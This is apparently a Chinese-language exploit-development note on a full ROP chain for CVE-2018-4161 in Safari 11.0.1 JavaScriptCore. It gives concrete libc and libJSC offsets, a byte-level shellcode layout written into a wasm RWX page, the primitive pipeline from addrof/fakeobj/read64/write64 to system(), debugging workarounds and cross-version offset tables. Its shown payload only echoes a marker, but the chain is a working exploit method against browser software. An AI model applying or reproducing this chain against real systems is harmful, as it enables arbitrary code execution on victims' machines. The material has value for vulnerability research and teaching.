---
description: Safari 11.0.1 JSC 从原语到 system() 的完整 ROP 链：gadget 选型的三重淘汰、shellcode 栈布局与对齐垫片、测试床先行的 movaps 崩溃、堆碰撞与 double-tag 的坑、跨版本测量。
---

# JavaScriptCore ROP 链

[库基址泄露](JavaScriptCore%20库基址泄露.md)解决了"libc 和 libJSC 的基址从哪来"，[调用约定与寄存器](调用约定与寄存器.md)解决了"参数放哪、栈什么形状"。这篇是两篇的合龙：在 Safari 11.0.1 的 release jsc（Ubuntu 20.04，glibc 2.31）上，从 CVE-2018-4161 的 addrof/fakeobj/read64/write64 出发，用一条**真正的栈式 ROP 链**调用 `system()`，终端打出 `[+] ROP success`，进程干净退出。

全程按当时实际调试的顺序记录：先定分工与选 gadget，再搭独立测试床（第一次跑就崩，崩点就是调用约定那篇的"事故现场"），塞进 exploit 后连环踩坑（负地址写、堆碰撞、浮点精度、double 编码），最后跨版本适配 11.0.2/11.0.3。

## 目标与分工

设计原则一句话：**静态脚本做搜索，exp 只做地址计算**。所有能在生成期解决的（gadget 偏移、符号偏移）都离线求出来写死，运行期拿到泄露的基址后只做一次 `base + offset` 加法，不做任何内存扫描：

```text
组装阶段(离线脚本,各输出一个偏移常量)
  扫描 libc:解析 ELF PT_LOAD+PF_X 段,搜字节 5f c3 → 0x23b6a(pop rdi ; ret)
  解析符号:ldd 定位 libc → nm -D 解析 system          → 0x52290
        ↓
运行阶段(exploit.js 在 release jsc 上执行)
  ① CVE-2018-4161 触发 → addrof / fakeobj / read64 / write64
  ② 基址泄露(anchor 链,方法见《库基址泄露》):
        describe() 泄露 Structure 地址
        read64(structure+0x268 / +0x2d8) 读 anchor(指向 libJSC 代码)
        libJSC base = anchor − 0xc37230
        libc base   = libJSC base − 0x2509000
        gadget = libcBase + 0x23b6a ; system = libcBase + 0x52290
  ③ addrof(func) → read64 拿 wasm RWX 页地址
     生成 ROP shellcode 字节(四个运行时地址小端填入)→ write64 写入 RWX 页 → func() 触发
  ④ shellcode 压入一条 mini ROP 链 → jmp gadget → system("echo [+] ROP success")
```

两个离线脚本的工程契约值得固定下来：**stdout 只输出偏移值**（供组装程序直接替换），**诊断信息全部走 stderr**，错误路径（参数缺失/libc 找不到/gadget 找不到）一律非零退出。换 libc、换机器时不需要改任何 JS——重跑脚本，偏移自动更新。

`nm -D` 解析 `system` 有个小坑：输出可能带版本后缀（`system@@GLIBC_2.2.5`），比较符号名时按第一个 `@` 截断；`system` 与 `__libc_system` 是同一地址。

## gadget 选型

最初设想的是最简单的 `call reg ; ret`，实测把它淘汰掉的过程本身就是一课。三重验证：

- ROPgadget 对 glibc-2.31 的完整 dump（10 万行）：`grep -E "call r[a-z0-9]+ ; ret"` → **0 条**；
- 自写字节扫描器（解析 ELF program headers，只扫 `PT_LOAD + PF_X` 段）：`ff d0 c3`（call rax）、`ff d1`（rcx）、`ff d2`（rdx）、`ff d6`（rsi）、`ff 10 c3`（call [rax]）……全部 NOT FOUND；
- libJavaScriptCore.so（16MB 代码段）和 jsc 主程序里同样没有 call 家族。

淘汰过程与最终选择：

| 候选 | 结论 |
|---|---|
| `call reg ; ret` | glibc 2.31 里**一条都不存在**（dump + 字节扫描双确认），淘汰 |
| `jmp reg`（如 `jmp rax` @ 0x23eba） | 存在，但 jmp 不 push 返回地址，system 入口 `rsp ≡ 0 (mod 16)`，glibc 内部的 `movaps` 对齐访问直接 SIGSEGV；且 call/jmp 两族要求的垫片方向相反，exp 必须运行时读 gadget 字节区分家族——引出后面一连串精度与堆布局问题，淘汰 |
| libJSC 里的 `call rax ; add rsp,8 ; ret` @ 0x2e9694 | 偏移来自 debug 构建就对 release 无效（两个完全不同的二进制，见下），淘汰 |
| **`pop rdi ; ret`** | **选用**：libc 里真实存在（0x23b6a）；语义唯一（只有 `5f c3` 一种 2 字节形态），不需要运行时读字节；对齐路径确定 |

除"能找到"之外还有两个主动理由：它**真正消耗栈**——rdi 的装载（参数）和 system 的分发（返回地址）都由它从栈上完成，链里缺了它就断，所以这是真 ROP 而不是装饰性跳转；且 `pop rdi ; ret` 是所有二进制里最普遍的 gadget，换 libc 版本基本必然还在，可移植性最好。

## shellcode 布局

链住进 wasm RWX 页，逐字节布局：

| 偏移 | 字节 | 含义 |
| --- | --- | --- |
| 0x00 | `48 83 EC 08` | `sub rsp, 8` — 栈对齐垫片 |
| 0x04 | `48 BA <retInto:8>` | `mov rdx, retInto`（= rwx+0x32） |
| 0x0E | `52` | `push rdx` — ROP 链底：system 返回的落点 |
| 0x0F | `48 B9 <system:8>` | `mov rcx, system` |
| 0x19 | `51` | `push rcx` — gadget 的 `ret` 跳到这里 |
| 0x1A | `48 B8 <cmd:8>` | `mov rax, cmd`（= rwx+0x50） |
| 0x24 | `50` | `push rax` — gadget `pop rdi` 弹到这里 |
| 0x25 | `49 BA <gadget:8>` | `mov r10, gadget`（libc `pop rdi ; ret`） |
| 0x2F | `41 FF E2` | `jmp r10` — 唯一一次跳转进 libc gadget |
| 0x32 | `48 83 C4 08` | `add rsp, 8` ← system 返回后落到这里 |
| 0x36 | `C3` | `ret` — 返回 wasm 调用方 |
| 0x37 | `00 …` | 填充到 0x50 |
| 0x50 | 命令串 + `\0` | `"echo [+] ROP success"` |

三个 imm64（retInto/system/cmd/gadget）都是"运行时才算得出"的地址（libcBase 要泄露后才有，rwx 要 wasm 实例建好后才有），所以需要在 JS 里现场"汇编"：按小端序把地址字节填进固定偏移。展开 imm64 的辅助函数刻意用 `% 0x100` / `Math.floor(value / 0x100)` 而不是 `>>`/`&`——**JS 的位运算是 32 位的**，`value >> 8` 会把 48 位地址截断，只有 double 的除法取模在 2^53 以内精确。

## 执行流与栈对齐

进入 shellcode 时（wasm 函数被 JSC 以标准 ABI 调用）`rsp = S`，且 `S ≡ 8 (mod 16)`：

```text
sub  rsp, 8     rsp = S-8  ≡ 0 (mod 16)
push retInto    rsp = S-16 ≡ 8     [S-16] = retInto
push system     rsp = S-24 ≡ 0     [S-24] = system
push cmd        rsp = S-32 ≡ 8     [S-32] = cmd
jmp  gadget     gadget 入口,rsp = S-32,栈顶就是 cmd
  pop  rdi      rdi = cmd          rsp = S-24
  ret           弹出 system 并跳过去,rsp = S-16 ≡ 8
system(cmd)     入口 rsp ≡ 8 (mod 16) —— 满足 SysV ABI,打印 ROP success
  ret           弹出 retInto,rsp = S-8 → 落到 shellcode 0x32 处
add  rsp, 8     rsp = S
ret             弹出 [S](wasm 调用方的返回地址),rsp = S+8
```

与正常函数返回完全一致：rsp 恢复到 `S+8`，rax 是 system 的返回值（wasm main 的 i32 结果），callee-saved 寄存器全程未动（gadget 只用 rdi/rsp，system 按 C ABI 保存其余）。所以 JSC 的 JS→wasm wrapper 能正常继续跑，进程最后干净退出。对齐规则的推导与那次 movaps 崩溃的完整分析见[调用约定与寄存器](调用约定与寄存器.md)。

## 独立测试床

把 shellcode 塞进真实 exploit 之前，先搭一个不经引擎的测试床（C/Python 充当 wasm 调用方）：

```bash
# harness.py:读 /proc/self/maps 拿本进程 libc 基址 →
#            mmap 一页 RWX 放 shellcode → 读 gadget 前两个字节验证 → 当函数调用
python3 harness.py
# [*] gadget @ 0x…eba verified: ffe0 (jmp rax)
# Segmentation fault              ← jmp rax 链第一次跑就崩
```

gdb 看崩点，崩在 libc 内部一条与本链"无关"的对齐访问上——`jmp` 型 gadget 不 push 返回地址，system 入口 `rsp ≡ 0 (mod 16)`，违反 ABI 假设。给 shellcode 加上 `sub rsp, 8 / add rsp, 8` 垫片后通过。这个测试床后来成为惯例：**每次改链先在床里验证字节，再进引擎**——半分钟的成本，省掉的是"在 JSC 里排查一个其实与引擎无关的崩溃"的整轮时间。

## 塞进 exploit 的坑

按实际踩坑顺序，每条都有实测依据。

### 负地址写

原始的 `ropWriteRawPointer` 实现里，`driver[1] - 0x1000000000000` 读回来的值 ≈ 0，写目标变成负地址。运行日志直接可见 `write64: 0x-1000000000000 <- …`，随后堆被写坏、段错误。设计意图是先用 `driver[1]` 重定向 `victim.prop` 的槽再直接赋值，但中间误包了一层 write64——write64 内部又做了一次自己的重定向。结论：删除这套间接写。

### 堆碰撞

中间版本保留过"Uint32Array 视图重定向"做无损读，写本身落点正确（日志里 vector 槽 ← 目标指针都对），但随后的 `ropRawView[0]` 仍然 SIGSEGV。gdb 定位：

```bash
gdb -q -batch -ex run -ex 'x/4i $rip' --args ./jsc --useConcurrentJIT=0 redirecttest.js
# SIGSEGV in llint_entry (libJavaScriptCore.so)
# => mov (%rcx,%rsi,4),%eax     ← typed array 元素读取
```

结合 `describe(victim)` 的 butterfly 地址发现：`victim.prop` 的存储槽恰好落在 `ropRawView + 0x18`——**Uint32Array 的 m_length/m_byteOffset 字段**。write64 内部每次赋值都把 ropRawView 的长度字段改掉，下一次 `ropRawView[0]` 就按被改坏的长度越界读。这是 JS 堆分配顺序的巧合，机制层面无解——结论：整个视图重定向子系统删除，anchor 改走 read64 直读。

### read64 的精度边界

`read64` 把两个 u32 拼成 double 再转回整数，值 ≥ 2^53 时舍入、低位失真。好在**指针永远安全**（用户空间地址 < 2^48），所以 anchor、基址、对象指针都能直读；任意 8 字节（如 gadget 处的代码字节）经常超界，不能用它做精确判断。选定语义唯一的 `pop rdi ; ret` 之后，运行时读 gadget 字节的需求整个消失——精度、视图重定向、负地址写三个问题被同一个选型决定一并解决。

### write64 的 double-tag

`write64(addr, v)` 经 `victim.prop = Debug.i2f(v)` 落地，值会经过 JSC 的 JSValue double 编码变换，经验规则：**内存里落的位模式 = v ⊕ tag**（Safari 11.0.x 的 tag 是 `0x1000000000000`；11.1 换成 `0xc000000000000`）。两条证据：写 `0x1337` 后读回 `0x1000000001337`（异或关系直接可见）；给 payload 预先异或上 tag 再写入，RWX 页里恰好是原始字节——本次 shellcode 实际执行成功。这也是写 RWX 页要按 6 字节一组打包的原因：JSC 会规范化 double 数组里的 NaN 位模式，一次只能可靠携带 6 字节 payload。

### 并发 JIT 的 flag

手动复现最初看到 `addrof` 返回 `0x7ff8000000000000`（NaN 位模式），一度以为原语坏了。真实原因：手动跑时漏了 `--useConcurrentJIT=0`——并发 JIT 下 1500 次热身后 DFG 编译可能还没在后台线程完成，攻击调用仍跑在 baseline 上，类型混淆不触发。补上 flag 立刻返回真实指针。**手测这个链必须带 `--useConcurrentJIT=0`**（同时关掉 `--useConcurrentGC=0`、限 `--maximumInliningDepth=1` 保优化形状）。

## 跨版本适配

基址与偏移的完整量法（gdb 量 delta、`/proc` 自旋量 anchor、两轮一致才可信）在[库基址泄露](JavaScriptCore%20库基址泄露.md)里已经展开，这里只记三个版本的实际结果：

| 版本 | delta（libJSC − libc） | anchor 链 | 结果 |
|---|---|---|---|
| Safari 11.0.1 | 0x2509000 | structure+0x268/0x2d8 → libJSC+0xc37230/0xc37640 | 链通过 |
| Safari 11.0.2 | 0x2509000（同） | +0xc37f20/+0xc38330（结构偏移不变，只重量 libJSC 偏移） | 链通过 |
| Safari 11.0.3 | **0x40a000（变了）** | Structure ±32KB 内**不再有任何 libJSC 指针**——anchor 消失 | 按需回退 |

11.0.3 的处理展示了两条备用路线：delta 证实必须逐版本量（gdb 实测 0x40a000 与前两版不同）；anchor 消失时从 `Math.sin` 这类内建函数出发做 BFS 搜指针链（`Math.sin → fn+0x10 → +0xb8 → libJSC+0x4209`，两轮一致），当次 ELF 自校验未通过、按需求回退到 11.0.1/11.0.2 支持版。跨版本迁移的固定工序：确认 CodeOffset → gdb 量 delta → 原语可用性 → `/proc` 量 anchor（两轮）→ 拼装验证 → 新常量入表。

顺带一个校验坑：对算出的基址做 ELF 头自校验时，期望值不能写成"经典 `\x7fELF` 头 8 字节"——libc 的 OSABI 字节是 3（GNU）不是 0，且整个首 qword ≥ 2^53、read64 会舍入。改读 `base+4` 的 3 个字节（ELF64/小端/版本 1，值极小必然精确）后，libc 和 libJSC 都通过。

## 验证

```bash
./cmake-build-release/bin/jsc --useConcurrentJIT=0 exploit.js
```

```text
… primitives 全 PASS …
[+] ROP success
```

进程退出码 0，重复多次运行稳定；链的每次字节改动都先过独立测试床再进引擎。验收标准除了"看到标记"，还包括干净返回——退出码 0 意味着 callee-saved 现场完好、JSC 的 wrapper 正常收尾，这正是栈对齐一节推导的验证点。

## 相关阅读

- [JavaScriptCore 库基址泄露](JavaScriptCore%20库基址泄露.md)：本文第二步（anchor 链、delta/anchor 量法）的完整方法论文。
- [调用约定与寄存器](调用约定与寄存器.md)：栈对齐、参数寄存器、那次 movaps 崩溃的 ABI 推导。
- [CVE-2023-41993 分析](CVE-2023-41993分析.md)：JSC 侧从 GetterSetter 泄漏到 addrof/fakeobj 的另一条入口。
- [CVE-2021-30517 分析](../v8/CVE-2021-30517分析.md)：V8 侧走到 RWX 与任意读写的完整链，两引擎对照。
